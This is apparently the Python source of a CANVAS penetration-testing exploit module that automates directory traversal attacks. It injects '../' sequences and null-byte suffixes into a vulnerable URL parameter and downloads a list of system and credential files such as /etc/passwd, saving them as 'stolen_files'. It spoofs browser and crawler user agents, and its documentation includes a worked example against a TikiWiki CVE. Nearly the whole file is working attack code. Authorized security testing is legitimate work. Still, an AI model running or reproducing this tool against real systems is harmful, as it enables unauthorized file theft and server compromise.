#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path: sys.path.append(".")

import os
from tcpexploit import tcpexploit
import urllib2


NAME="Universal Directory Traversal File Downloader"
DESCRIPTION="Downloads files through a supplied directory traversal vulnerability"
DOCUMENTATION={}

DOCUMENTATION["Notes"]        = """Directory traversal vulnerabilities are very simple to exploit and can easily allow for complete compromise of a target application and server.
There are certain files on systems that, if obtained, can open up more exploitable opprotunities.  

All you do is supply the module with the URL and vulnerable parameter (marked by wildcard **)
And the module will find the files for you and save them to Reports/<current CANVAS session>/<target hostname/IP>/stolen_files

The module will read and attempt to dowlonad any file that is in Resources/dot_dot_slash/filelist.txt.  It is a big list with lots of files that you will most certainly want to have! 
Feel free to edit the file but stick to the proper file name convention
"""
DOCUMENTATION["Example"]="""There is a directory traversal vulnerabilitiy in TikiWiki < 1.9.9 (CVE-2007-6528) in tiki.listmovies.php
http://www.target.com/tiki-listmovies.php?movie=../../../../../../etc/passwd%001234

The default directory depth of 15 is enough to reach the root of the drive in this case.

To succeed you need to append %001234 to the end of the filename so set the suffix to %001234 and enter the target URL like so:

http://www.target.com/tiki-listmovies.php?movie=**

And that's it!
"""


VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY["TYPE"]= "Recon"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["All"] ]
PROPERTY["VERSION"]= []


NOTES="""

"""

CHANGELOG="""
CREATED JUNE 11, 2009
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.url       = ""
        self.UserAgent = ""
        self.direnum   = False #this is a feature that I might add later.
        self.outputdir = ""
        self.filelist  = os.path.join("Resources","dot_dot_slash","filelist.txt")
        self.os        = ""
        self.tosteal   = []
        self.depth     = 15 #how many directories deep we go to get to the root of the drive.  This should be enough
        self.count     = 0  #how many files we successfully stole
        self.suffix    = "" #in some attacks - the filename needs to have something appended to it to succeed (for example %00)
        return
    
    def getargs(self):
        self.os          = self.argsDict.get("os", self.os)
        self.filelist    = self.argsDict.get("filelist", self.filelist)
        self.direnum     = self.argsDict.get("direnum", self.direnum)
        self.UserAgent   = self.argsDict.get("UserAgent",self.UserAgent)
        self.url         = self.argsDict.get("url", self.url)
        self.suffix      = self.argsDict.get("suffix", self.suffix)
        self.count       = int(self.argsDict.get("count", self.count))
        
        useragents ={"Internet Explorer 7.0":"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US",
                     "Internet Explorer 6.1":"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.433; .NET CLR 2.0.50727)",
                     "Firefox 3.8":"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
                     "Opera 9.70":"Opera/9.70 (Linux i686; U; en) Presto/2.2.0",
                     "Safari 4.0":"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
                     "Lynx 2.8.5r1":"Lynx/2.8.5rel.1 libwww-FM/2.14FM",
                     "Googlebot":"Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
                     "Yahoo! Slurp":"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/ys/ysearch/slurp)",
                     "None":""
                     }
        try:
            self.UserAgent=useragents[self.UserAgent]
            self.log("using user-agent: %s"%self.UserAgent)
        except:
            self.UserAgent=""
        
        for f in file(self.filelist, "r").readlines():
            if "#" in f:
                pass
            else:
                f=f.replace(" ","%20").strip()
                self.tosteal.append(f)

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def neededListenerTypes(self):
        return []
    
    def set_output_dir(self, url):
        #ugly parsing of domain name :/
        pos=url.find("/")
        pos=pos+2
        pos2=url[pos:].find("/")
        site=url[pos:pos+pos2]
        self.log("site name %s"%site)
        self.outputdir = self.output(ip=site, subdir="stolen_files")
        
    def get_files(self):
        
        self.log("Attempting to steal %d files"%len(self.tosteal))
        for f in self.tosteal:
            f = f+self.suffix
            path=self.url.replace("**","../"*self.depth+f)
            #self.log("attempting to retrive %s"%path)
            data=urllib2.urlopen(path).read()
            if len(data) > 0:
                print data
                self.count+=1
                localfilename=f.replace("/","_").replace("%20","_").replace(self.suffix,"")
                outfile=file(os.path.join(self.outputdir,localfilename), "w")
                outfile.write(data)
                outfile.close()
            else:
                #file not found
                pass
        
        if self.count > 0:
            self.log("%d file(s) were successfully stolen.  Check your output directory!"%self.count)
            return 1
        else:
            self.log("no files were stolen - are all the parameters correct?")
            return 0
 
        
    def run(self):
        self.getargs()
        self.set_output_dir(self.url)
        ret = self.get_files()
        if ret == 0:
            return 0
        else:
            return 1
     
        
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
